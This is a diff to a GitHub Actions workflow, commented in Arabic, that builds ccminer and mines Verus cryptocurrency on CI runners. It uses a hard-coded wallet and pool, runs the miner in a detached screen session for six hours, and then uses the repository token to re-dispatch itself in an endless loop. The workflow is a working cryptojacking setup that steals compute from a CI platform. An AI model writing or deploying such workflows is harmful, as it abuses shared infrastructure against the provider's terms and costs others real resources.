@@ -37,56 +37,98 @@ jobs:
       - name: Install ccminer & Start Mining
         run: |
           #!/bin/bash
-          WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
+          # تعريف المتغيرات الأساسية
+          WALLET="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
           POOL="pool.verus.io:9998"
-          TH=4
+          THREADS=4
 
-          # Worker name عشوائي
+          # إنشاء اسم عامل عشوائي
           RAND_NUM=$(shuf -i 1000-9999 -n 1)
           RAND_CHARS=$(tr -dc 'a-zA-Z' </dev/urandom | head -c 2)
-          WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
-          echo "👷 Worker Name: $WRK"
+          WORKER_NAME="ubuntu${RAND_NUM}${RAND_CHARS}"
+          echo "👷 Worker Name: $WORKER_NAME"
 
-          cd ~ || exit 1
+          # الانتقال إلى الدليل الرئيسي
+          cd $HOME || exit 1
 
+          # تثبيت التبعيات المطلوبة للتعدين
+          sudo apt install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev
+
+          # استنساخ وتثبيت ccminer إذا لم يكن موجودًا
           if [ ! -d "$HOME/ccminer" ]; then
             git clone https://github.com/Oink70/ccminer-verus.git ccminer
           fi
 
+          # الانتقال إلى دليل ccminer والبناء
           cd ccminer || exit 1
+          
+          # إذا كان هناك ملف configure، قم بتشغيله أولاً
+          if [ -f "configure" ]; then
+            ./configure --with-crypto --with-curl
+          fi
+          
           make clean || true
-          ./build.sh
+          
+          # محاولة البناء باستخدام make
+          make -j$(nproc) || {
+            echo "⚠️ Build failed, trying alternative build method..."
+            ./build.sh
+          }
 
+          # إنشاء ملف الإعدادات
           cat > config.json <<EOF
 {
   "pools": [
-    { "name": "CUSTOM", "url": "stratum+tcp://${POOL}", "timeout": 180, "disabled": 0 }
+    { 
+      "name": "CUSTOM", 
+      "url": "stratum+tcp://${POOL}", 
+      "timeout": 180, 
+      "disabled": 0 
+    }
   ],
-  "user": "${WAL}.${WRK}",
+  "user": "${WALLET}.${WORKER_NAME}",
   "pass": "x",
   "algo": "verus",
-  "threads": ${TH},
+  "threads": ${THREADS},
   "api-bind": "127.0.0.1:4068"
 }
 EOF
 
+          # بدء التعدين في جلسة screen
           screen -dmS verus_mining ./ccminer -c config.json
-          echo "🚀 التعدين بدأ Worker: ${WRK}"
+          echo "🚀 التعدين بدأ Worker: ${WORKER_NAME}"
           echo "▶️ للرجوع للجلسة: screen -r verus_mining"
+          echo "📊 للتحقق من العمل: screen -list"
 
       - name: Run VPS for 6 hours
         run: |
-          echo "⏳ VPS running..."
-          sleep 21600   # 6 ساعات
+          echo "⏳ VPS running for 6 hours..."
+          # إظهار تقدم الوقت كل دقيقة
+          for i in {1..360}; do
+            sleep 60
+            echo "⏰ Running for $i minutes..."
+          done
+
+      - name: Cleanup and Stop Mining
+        run: |
+          echo "🧹 Cleaning up..."
+          # إيقاف عملية التعدين
+          screen -S verus_mining -X quit 2>/dev/null || true
+          pkill -f ccminer 2>/dev/null || true
+          echo "✅ Mining stopped and cleanup completed"
 
       - name: Restart This Workflow
+        if: always()  # يعمل حتى إذا فشلت الخطوات السابقة
         env:
           REPO: ${{ github.repository }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "🔄 Restarting workflow"
-          curl -X POST \
+          echo "🔄 Attempting to restart workflow..."
+          # إضافة تحقق قبل إعادة التشغيل
+          sleep 5
+          curl -s -X POST \
             -H "Accept: application/vnd.github+json" \
             -H "Authorization: Bearer $GITHUB_TOKEN" \
             https://api.github.com/repos/$REPO/actions/workflows/vps4.yml/dispatches \
-            -d '{"ref":"main"}'
+            -d '{"ref":"${{ github.ref }}"}'
+          echo "✅ Restart command sent"
